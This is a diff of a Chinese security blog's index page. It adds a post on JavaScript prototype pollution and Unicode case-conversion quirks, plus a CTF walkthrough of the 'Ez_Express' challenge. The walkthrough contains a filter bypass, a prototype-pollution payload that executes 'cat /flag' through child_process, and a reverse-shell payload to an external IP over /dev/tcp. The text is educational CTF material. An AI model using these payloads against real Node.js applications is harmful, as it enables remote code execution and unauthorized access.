@@ -114,7 +114,7 @@
 				
 				<section class="switch-part switch-part2">
 					<div class="widget tagcloud" id="js-tagcloud">
-						<a href="/tags/SSRF/" style="font-size: 11.25px;">SSRF</a> <a href="/tags/SSTI/" style="font-size: 12.5px;">SSTI</a> <a href="/tags/http/" style="font-size: 11.25px;">http</a> <a href="/tags/java/" style="font-size: 13.75px;">java</a> <a href="/tags/misc/" style="font-size: 11.25px;">misc</a> <a href="/tags/nodejs/" style="font-size: 10px;">nodejs</a> <a href="/tags/php%E7%89%B9%E6%80%A7/" style="font-size: 12.5px;">php特性</a> <a href="/tags/sql%E6%B3%A8%E5%85%A5/" style="font-size: 18.75px;">sql注入</a> <a href="/tags/ssrf/" style="font-size: 12.5px;">ssrf</a> <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 20px;">代码审计</a> <a href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" style="font-size: 16.25px;">命令执行</a> <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="font-size: 11.25px;">文件上传</a> <a href="/tags/%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2%E5%8F%8A%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 10px;">文件泄露及代码审计</a> <a href="/tags/%E6%A1%86%E6%9E%B6/" style="font-size: 11.25px;">框架</a> <a href="/tags/%E6%A8%A1%E6%9D%BF/" style="font-size: 15px;">模板</a> <a href="/tags/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">模板注入</a> <a href="/tags/%E7%88%86%E7%A0%B4/" style="font-size: 10px;">爆破</a> <a href="/tags/%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99/" style="font-size: 17.5px;">脚本编写</a>
+						<a href="/tags/SSRF/" style="font-size: 11.43px;">SSRF</a> <a href="/tags/SSTI/" style="font-size: 12.86px;">SSTI</a> <a href="/tags/http/" style="font-size: 11.43px;">http</a> <a href="/tags/java/" style="font-size: 12.86px;">java</a> <a href="/tags/misc/" style="font-size: 11.43px;">misc</a> <a href="/tags/nodejs/" style="font-size: 12.86px;">nodejs</a> <a href="/tags/php%E7%89%B9%E6%80%A7/" style="font-size: 12.86px;">php特性</a> <a href="/tags/sql%E6%B3%A8%E5%85%A5/" style="font-size: 18.57px;">sql注入</a> <a href="/tags/ssrf/" style="font-size: 12.86px;">ssrf</a> <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 20px;">代码审计</a> <a href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" style="font-size: 15.71px;">命令执行</a> <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="font-size: 11.43px;">文件上传</a> <a href="/tags/%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2%E5%8F%8A%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 10px;">文件泄露及代码审计</a> <a href="/tags/%E6%A1%86%E6%9E%B6/" style="font-size: 11.43px;">框架</a> <a href="/tags/%E6%A8%A1%E6%9D%BF/" style="font-size: 14.29px;">模板</a> <a href="/tags/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">模板注入</a> <a href="/tags/%E7%88%86%E7%A0%B4/" style="font-size: 10px;">爆破</a> <a href="/tags/%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99/" style="font-size: 17.14px;">脚本编写</a>
 					</div>
 				</section>
 				
@@ -171,6 +171,118 @@
 	</div>
 </nav>
       <div class="body-wrap">
+  
+    <article id="post-js原型链污染以及js大小写函数特性" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2021/10/21/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E4%BB%A5%E5%8F%8Ajs%E5%A4%A7%E5%B0%8F%E5%86%99%E5%87%BD%E6%95%B0%E7%89%B9%E6%80%A7/" class="article-date">
+  	<time datetime="2021-10-20T16:00:00.000Z" itemprop="datePublished">2021-10-21</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/10/21/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E4%BB%A5%E5%8F%8Ajs%E5%A4%A7%E5%B0%8F%E5%86%99%E5%87%BD%E6%95%B0%E7%89%B9%E6%80%A7/">
+        js原型链污染以及js大小写函数特性
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="js原型链污染以及js大小写函数特性"><a href="#js原型链污染以及js大小写函数特性" class="headerlink" title="js原型链污染以及js大小写函数特性"></a>js原型链污染以及js大小写函数特性</h1><h2 id="js原型链污染"><a href="#js原型链污染" class="headerlink" title="js原型链污染"></a>js原型链污染</h2><p>javaScript是一门灵活的语言，基于原型实现继承，原型是javascript的继承基础，而根据ECMAScript标准，someObject.[[Prototype]]符号是用于指向someObject的原型，而从ECMAScript6开始，[[Prototype]]可以通过Object.getPrototypeOf()和Object.setPrototypeOf()访问器来访问</p>
+<p>每一个实例化对象都有一个私有属性__proto__指向它的构造函数的原型prototype，即</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test1.__proto__==Test.prototype //true</span><br></pre></td></tr></table></figure>
+<p>原型prototype是类的一个属性，而这个属性中的值和方法是每一个由该类实例化出来的对象所共有的，我们可以通过实例化对象test1.__proto__来访问Test类的原型，如果我们可以控制实例化对象的__proto__属性，则等于可以修改该类的所有实例化对象的__proto__属性</p>
+<h3 id="原型链污染原理"><a href="#原型链污染原理" class="headerlink" title="原型链污染原理"></a>原型链污染原理</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">test1=new Test()</span><br><span class="line">test2=new Test()</span><br><span class="line"></span><br><span class="line">test1.b //undefined</span><br><span class="line"></span><br><span class="line">test2.__proto__.b=&quot;12&quot;</span><br><span class="line"></span><br><span class="line">test1.b //12</span><br></pre></td></tr></table></figure>
+<p>我们可以看见本来Test类的实例化对象test1是没有b属性的，但是当我们对Test类的实例化对象test2做了私有属性__proto__赋值后(test2.__proto__指向Test的原型prototype)，test1.b就有值了，这是因为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. 在执行test1.b时，会先在对象test1中寻找b</span><br><span class="line">2. 找不到时，会在test1.__proto__中寻找(这里的test1.__proto__一样是指向Test类的原型prototype)</span><br><span class="line">3. 如果仍然找不到的话，就会在test1.__proto__.__proto__中继续寻找b</span><br><span class="line">4. 因此寻找，知道找到null结束(即Object.prototype的__proto__就是null)</span><br></pre></td></tr></table></figure>
+
+<p>在js中，我们可以通过找到可以控制数组(对象)的键名的位置来控制实例化对象的__proto__来污染原型链，比较明显的是以下两个对象</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1. 对象clone</span><br><span class="line">2. 对象merge</span><br></pre></td></tr></table></figure>
+<p>同时如果要__proto__作为key可以被赋值的话，需要使用json进行解析，否则会将__proto__当作是原型而不是key，从而无法进行污染，实例如下</p>
+<p>污染链失败</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">let o1=&#123;&#125;</span><br><span class="line">let o2=&#123;a:1,&quot;__proto__&quot;:&#123;b:2&#125;&#125;</span><br><span class="line">merge(o1,o2) //1 2</span><br><span class="line">console.log(o1.a,o1.b) //无结果输出</span><br></pre></td></tr></table></figure>
+
+<p>污染链成功</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">let o1=&#123;&#125;</span><br><span class="line">let o2=JSON.parse(&#x27;&#123;&quot;a&quot;:1,&quot;__proto__&quot;:&#123;&quot;b&quot;:2&#125;&#125;&#x27;)</span><br><span class="line">merge(o1,o2) //1 2</span><br><span class="line">console.log(o1.a,o1.b) //2</span><br></pre></td></tr></table></figure>
+
+<p>而对于要污染哪个变量，需要找代码的执行点，js代码代码执行点可以找</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1. eval函数</span><br><span class="line">2. new Function</span><br></pre></td></tr></table></figure>
+<p>而对于包中的Content-Type字段，需要改为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-type: application/json</span><br></pre></td></tr></table></figure>
+
+<h2 id="js大小写函数特性"><a href="#js大小写函数特性" class="headerlink" title="js大小写函数特性"></a>js大小写函数特性</h2><h3 id="toUpperCase"><a href="#toUpperCase" class="headerlink" title="toUpperCase()"></a>toUpperCase()</h3><p>toUpperCase()是javascript中将小写转换为大写的函数，它有一个特性，就是有两个奇特字符在经过toUpperCase()后会变为大写的I和S</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;ı&quot;.toUpperCase() == &#x27;I&#x27;</span><br><span class="line"></span><br><span class="line">&quot;ſ&quot;.toUpperCase() == &#x27;S&#x27;</span><br></pre></td></tr></table></figure>
+
+<h3 id="toLowerCase"><a href="#toLowerCase" class="headerlink" title="toLowerCase()"></a>toLowerCase()</h3><p>toLowerCase()是js中将大写转换为小写的函数，它也有一个特性，就是将一个奇特字符在经过toUpperCase()后会变为小写的k</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;K&quot;.toLowerCase() == &#x27;k&#x27;</span><br></pre></td></tr></table></figure>
+
+<h2 id="实例（Ez-Express"><a href="#实例（Ez-Express" class="headerlink" title="实例（Ez_Express)"></a>实例（Ez_Express)</h2><p>打开页面，我们发现是一个注册/登录界面，而且给出提示，要使用admin来注册登录，但是却不行，所以我们可以使用dirmap进行扫描，发现有<a target="_blank" rel="noopener" href="http://www.zip泄露,解压后,我们看核心源码/">www.zip泄露，解压后，我们看核心源码</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">index.js</span><br><span class="line">app.js</span><br></pre></td></tr></table></figure>
+<p>查看index.js</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">var express = require(&#x27;express&#x27;);</span><br><span class="line">var router = express.Router();</span><br><span class="line">const isObject = obj =&gt; obj &amp;&amp; obj.constructor &amp;&amp; obj.constructor === Object;</span><br><span class="line">const merge = (a, b) =&gt; &#123;</span><br><span class="line">  for (var attr in b) &#123;</span><br><span class="line">    if (isObject(a[attr]) &amp;&amp; isObject(b[attr])) &#123;</span><br><span class="line">      merge(a[attr], b[attr]);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      a[attr] = b[attr];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return a</span><br><span class="line">&#125;</span><br><span class="line">const clone = (a) =&gt; &#123;</span><br><span class="line">  return merge(&#123;&#125;, a);</span><br><span class="line">&#125;</span><br><span class="line">function safeKeyword(keyword) &#123;</span><br><span class="line">  if(keyword.match(/(admin)/is)) &#123;</span><br><span class="line">      return keyword</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  return undefined</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">router.get(&#x27;/&#x27;, function (req, res) &#123;</span><br><span class="line">  if(!req.session.user)&#123;</span><br><span class="line">    res.redirect(&#x27;/login&#x27;);</span><br><span class="line">  &#125;</span><br><span class="line">  res.outputFunctionName=undefined;</span><br><span class="line">  res.render(&#x27;index&#x27;,data=&#123;&#x27;user&#x27;:req.session.user.user&#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">router.get(&#x27;/login&#x27;, function (req, res) &#123;</span><br><span class="line">  res.render(&#x27;login&#x27;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">router.post(&#x27;/login&#x27;, function (req, res) &#123;</span><br><span class="line">  if(req.body.Submit==&quot;register&quot;)&#123;</span><br><span class="line">   if(safeKeyword(req.body.userid))&#123;</span><br><span class="line">    res.end(&quot;&lt;script&gt;alert(&#x27;forbid word&#x27;);history.go(-1);&lt;/script&gt;&quot;) </span><br><span class="line">   &#125;</span><br><span class="line">    req.session.user=&#123;</span><br><span class="line">      &#x27;user&#x27;:req.body.userid.toUpperCase(),</span><br><span class="line">      &#x27;passwd&#x27;: req.body.pwd,</span><br><span class="line">      &#x27;isLogin&#x27;:false</span><br><span class="line">    &#125;</span><br><span class="line">    res.redirect(&#x27;/&#x27;); </span><br><span class="line">  &#125;</span><br><span class="line">  else if(req.body.Submit==&quot;login&quot;)&#123;</span><br><span class="line">    if(!req.session.user)&#123;res.end(&quot;&lt;script&gt;alert(&#x27;register first&#x27;);history.go(-1);&lt;/script&gt;&quot;)&#125;</span><br><span class="line">    if(req.session.user.user==req.body.userid&amp;&amp;req.body.pwd==req.session.user.passwd)&#123;</span><br><span class="line">      req.session.user.isLogin=true;</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">      res.end(&quot;&lt;script&gt;alert(&#x27;error passwd&#x27;);history.go(-1);&lt;/script&gt;&quot;)</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">  &#125;</span><br><span class="line">  res.redirect(&#x27;/&#x27;); ;</span><br><span class="line">&#125;);</span><br><span class="line">router.post(&#x27;/action&#x27;, function (req, res) &#123;</span><br><span class="line">  if(req.session.user.user!=&quot;ADMIN&quot;)&#123;res.end(&quot;&lt;script&gt;alert(&#x27;ADMIN is asked&#x27;);history.go(-1);&lt;/script&gt;&quot;)&#125; </span><br><span class="line">  req.session.user.data = clone(req.body);</span><br><span class="line">  res.end(&quot;&lt;script&gt;alert(&#x27;success&#x27;);history.go(-1);&lt;/script&gt;&quot;);  </span><br><span class="line">&#125;);</span><br><span class="line">router.get(&#x27;/info&#x27;, function (req, res) &#123;</span><br><span class="line">  res.render(&#x27;index&#x27;,data=&#123;&#x27;user&#x27;:res.outputFunctionName&#125;);</span><br><span class="line">&#125;)</span><br><span class="line">module.exports = router;</span><br></pre></td></tr></table></figure>
+<p>我们看见clone和merge，可以初步判断是js原型链污染，而我们再看这个点</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">res.render(&#x27;index&#x27;,data=&#123;&#x27;user&#x27;:res.outputFunctionName&#125;);</span><br></pre></td></tr></table></figure>
+<p>可知，我们污染的变量是outputFunctionName，因为这个变量的值会写入index中，然后被执行</p>
+<p>但是首先我们需要注册/登录，而从safeKeyword(req.body.userid)，查看safeKeyword()函数，</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function safeKeyword(keyword) &#123;</span><br><span class="line">  if(keyword.match(/(admin)/is)) &#123;</span><br><span class="line">      return keyword</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+<p>可见其过滤了admin，但是有一个点，让我们可以利用js的特性进行突破</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;user&#x27;:req.body.userid.toUpperCase()</span><br></pre></td></tr></table></figure>
+<p>所以我们使用”ı”来代替”I”，所以我们可以利用admın来进行注册登录，然后根据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">router.post(&#x27;/action&#x27;, function (req, res) &#123;</span><br><span class="line">  if(req.session.user.user!=&quot;ADMIN&quot;)&#123;res.end(&quot;&lt;script&gt;alert(&#x27;ADMIN is asked&#x27;);history.go(-1);&lt;/script&gt;&quot;)&#125; </span><br><span class="line">  req.session.user.data = clone(req.body);</span><br><span class="line">  res.end(&quot;&lt;script&gt;alert(&#x27;success&#x27;);history.go(-1);&lt;/script&gt;&quot;);  </span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+<p>构造一条原型链</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;lua&quot;:&quot;a&quot;,&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;a=1;return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;cat /flag&#x27;)//&quot;&#125;,&quot;Submit&quot;:&quot;&quot;&#125;</span><br></pre></td></tr></table></figure>
+<p>然后构造payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">get提交</span><br><span class="line">/action</span><br><span class="line"></span><br><span class="line">post提交</span><br><span class="line">&#123;&quot;lua&quot;:&quot;a&quot;,&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;a=1;return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;cat /flag&#x27;)//&quot;&#125;,&quot;Submit&quot;:&quot;&quot;&#125;</span><br><span class="line"></span><br><span class="line">同时将改为Content-type: application/json</span><br></pre></td></tr></table></figure>
+<p>再访问/info即可下载flag</p>
+<p>也可以反弹shell，来执行命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/118.31.168.198/39543 0&gt;&amp;1\&quot;&#x27;);var __tmp2&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>参考文章：[<a target="_blank" rel="noopener" href="https://www.cnblogs.com/escape-w/p/12347705.html]">https://www.cnblogs.com/escape-w/p/12347705.html]</a></p>
+<pre><code>[https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html]
+
+[https://blog.csdn.net/qq_45691294/article/details/109320437]
+</code></pre>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/nodejs/" rel="tag">nodejs</a></li></ul>
+	</div>
+
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
   
     <article id="post-pop链5之sql注入的反序列化利用" class="article article-type-post" itemscope itemprop="blogPost">
   
@@ -997,209 +1109,6 @@
       
 	<div class="article-tag tagcloud">
 		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li></ul>
-	</div>
-
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-      
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-  
-    <article id="post-vm2沙箱逃逸" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2021/10/12/vm2%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/" class="article-date">
-  	<time datetime="2021-10-11T16:00:00.000Z" itemprop="datePublished">2021-10-12</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/10/12/vm2%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/">
-        vm2沙箱逃逸
-        
-      </a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="vm2沙箱逃逸"><a href="#vm2沙箱逃逸" class="headerlink" title="vm2沙箱逃逸"></a>vm2沙箱逃逸</h1><h2 id="vm2-API"><a href="#vm2-API" class="headerlink" title="vm2 API"></a>vm2 API</h2><h3 id="proxy代理"><a href="#proxy代理" class="headerlink" title="proxy代理"></a>proxy代理</h3><p>proxy用于修改某些操作的默认行为，等同于在语言层面做出修改，所以属于一种”元编程”，即对编程语言进行编程，可以理解成在目标对象之前架设一层”拦截”，外界对该对象进行访问时，都必须先通过这层拦截，因此提供一种机制，可以对外界的访问进行过滤和改写，这种操作可以被称为”代理器”</p>
-<p>实例</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">var obj = new Proxy(&#123;&#125;, &#123;</span><br><span class="line">  get: function (target, propKey, receiver) &#123;</span><br><span class="line">    console.log(`getting $&#123;propKey&#125;!`);</span><br><span class="line">    return Reflect.get(target, propKey, receiver);</span><br><span class="line">  &#125;,</span><br><span class="line">  set: function (target, propKey, value, receiver) &#123;</span><br><span class="line">    console.log(`setting $&#123;propKey&#125;!`);</span><br><span class="line">    return Reflect.set(target, propKey, value, receiver);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
-<p>上面代码相当于对一个空对象架设了一层拦截，对属性的读取(get)和设置(set)行为进行重新的定义，如果对obj里的属性进行读取或设置的话，就会有以下的结果</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">obj.count=1; //结果为：setting count!</span><br><span class="line"></span><br><span class="line">obj.count;   //结果为：getting count!</span><br></pre></td></tr></table></figure>
-<p>从结果中，我们可以知道对obj里的属性的读取和设置都进行了拦截</p>
-<p>而ES6原生提供的Proxy构造函数，用来生成Proxy实例</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var proxy=new Proxy(target,handler);</span><br></pre></td></tr></table></figure>
-<p>其中new Proxy()表示生成一个Proxy实例，而target参数表示要拦截的目标对象，handler参数也是一个对象，用来定制拦截行为</p>
-<p>当然有一个技巧是将Proxy对象，设置到object.proxy属性，从而可以在object对象上调用，即</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var object=&#123;proxy:new Proxy(target,handler)&#125;;</span><br></pre></td></tr></table></figure>
-<p>实例</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">var proxy = new Proxy(&#123;&#125;, &#123;</span><br><span class="line">  get: function(target, propKey) &#123;</span><br><span class="line">    return 35;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">let obj = Object.create(proxy);</span><br><span class="line">obj.time // 35</span><br></pre></td></tr></table></figure>
-<p>proxy对象是obj对象的模型，而由于obj对象本身并没有time属性，所以根据原型链，会在proxy对象上读取该属性，导致被拦截</p>
-<p>同一个拦截函数可以设置多个拦截操作，一共13种</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">get(target,propKey,receiver)：拦截对象属性的读取</span><br><span class="line"></span><br><span class="line">set(target,propKey,value,receiver)：拦截对象属性的设置</span><br><span class="line"></span><br><span class="line">has(target,propKry)：拦截propKey in proxy的操作，返回一个布尔值</span><br><span class="line"></span><br><span class="line">deleteProperty(target, propKey)：拦截delete proxy[propKey]的操作，返回一个布尔值。</span><br><span class="line"></span><br><span class="line">ownKeys(target)：拦截Object.getOwnPropertyNames(proxy)、Object.getOwnPropertySymbols(proxy)、Object.keys(proxy)、for...in循环，返回一个数组</span><br><span class="line"></span><br><span class="line">getOwnPropertyDescriptor(target, propKey)：拦截Object.getOwnPropertyDescriptor(proxy, propKey)，返回属性的描述对象</span><br><span class="line"></span><br><span class="line">defineProperty(target, propKey, propDesc)：拦截Object.defineProperty(proxy, propKey, propDesc）、Object.defineProperties(proxy, propDescs)，返回一个布尔值</span><br><span class="line"></span><br><span class="line">preventExtensions(target)：拦截Object.preventExtensions(proxy)，返回一个布尔值。</span><br><span class="line"></span><br><span class="line">getPrototypeOf(target)：拦截Object.getPrototypeOf(proxy)，返回一个对象</span><br><span class="line"></span><br><span class="line">isExtensible(target)：拦截Object.isExtensible(proxy)，返回一个布尔值。</span><br><span class="line"></span><br><span class="line">setPrototypeOf(target, proto)：拦截Object.setPrototypeOf(proxy, proto)，返回一个布尔值</span><br><span class="line"></span><br><span class="line">apply(target, object, args)：拦截 Proxy 实例作为函数调用的操作</span><br><span class="line"></span><br><span class="line">construct(target, args)：construct(target, args)</span><br></pre></td></tr></table></figure>
-
-<h3 id="vm2实现原理"><a href="#vm2实现原理" class="headerlink" title="vm2实现原理"></a>vm2实现原理</h3><p>vm2的代码有四个主要文件</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">cli.js：实现vm2的命令行调用</span><br><span class="line"></span><br><span class="line">contextify.js：封装了三个对象，Contextify和Decontextify，并且针对global的Buffer类进行代理</span><br><span class="line"></span><br><span class="line">main.js：vm2执行的入口，导出了nodeVM，VM这两个沙箱环境，还有一个VMSCript实际上是封装了vm.Script</span><br><span class="line"></span><br><span class="line">sandbox.js：针对global的一些函数和变量进行了hook，如:setTimeout，setInterval等</span><br><span class="line"></span><br><span class="line">vm2利用es6新增的proxy特性来拦截对constructor和__proto__这些属性的访问</span><br><span class="line"></span><br><span class="line">实例</span><br></pre></td></tr></table></figure>
-<p>const {VM, VMScript} = require(“vm2”);</p>
-<p>const script = new VMScript(“let a = 2;a”);</p>
-<p>let vm = new VM();</p>
